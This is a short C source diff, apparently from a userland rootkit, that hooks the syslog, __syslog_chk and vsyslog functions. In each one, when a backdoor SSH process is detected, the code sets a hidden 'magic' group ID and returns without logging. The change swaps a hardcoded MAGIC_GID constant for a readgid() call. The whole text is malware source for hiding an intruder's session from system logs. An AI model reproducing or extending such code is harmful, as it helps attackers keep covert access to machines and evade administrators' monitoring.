@@ -10,7 +10,7 @@ void syslog(int priority, const char *format, ...){
 
     if(bd_sshproc()){
         hook(CSETGID);
-        call(CSETGID, MAGIC_GID);
+        call(CSETGID, readgid());
         return;
     }
 
@@ -26,7 +26,7 @@ void __syslog_chk(int priority, int flag, const char *format, ...){
 
     if(bd_sshproc()){
         hook(CSETGID);
-        call(CSETGID, MAGIC_GID);
+        call(CSETGID, readgid());
         return;
     }
 
@@ -42,7 +42,7 @@ void vsyslog(int priority, const char *format, va_list ap){
 
     if(bd_sshproc()){
         hook(CSETGID);
-        call(CSETGID, MAGIC_GID);
+        call(CSETGID, readgid());
         return;
     }
 
